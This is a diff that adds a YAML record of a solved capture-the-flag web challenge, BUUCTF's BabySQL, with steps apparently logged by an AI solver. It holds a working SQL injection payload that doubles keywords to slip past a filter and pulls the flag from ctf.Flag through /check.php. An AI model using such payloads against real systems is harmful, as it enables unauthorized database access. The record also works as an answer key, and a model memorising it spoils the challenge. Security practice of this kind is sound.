@@ -1,0 +1,24 @@
+name: '[极客大挑战 2019]BabySQL 747aa19e0315'
+category: web
+keywords:
+- babysql
+- imported
+- from
+- buuctf
+- ctfd
+steps:
+- '[claude] `Flag` table lives in schema `ctf` (not `geek`), column `flag`; value
+  is `<FLAG>`'
+- '[claude] Final working payload: `password=1'' uunionnion sselectelect 1,flag,3
+  ffromrom ctf.Flag -- -` against `/check.php`'
+- '[claude] FOUND_FLAG=<FLAG>'
+- Native Worker completed a bounded evidence-backed observation
+evidence_chain:
+- '[claude] `Flag` table lives in schema `ctf` (not `geek`), column `flag`; value
+  is `<FLAG>`'
+- '[claude] Final working payload: `password=1'' uunionnion sselectelect 1,flag,3
+  ffromrom ctf.Flag -- -` against `/check.php`'
+- '[claude] FOUND_FLAG=<FLAG>'
+success_format: CTF2\{[^}]+\}
+source: 747aa19e-0315-42d7-ba24-e0917171d05e (solver 2a4323a2-35ed-4091-a296-5c0fdbcf0839)
+notes: ''
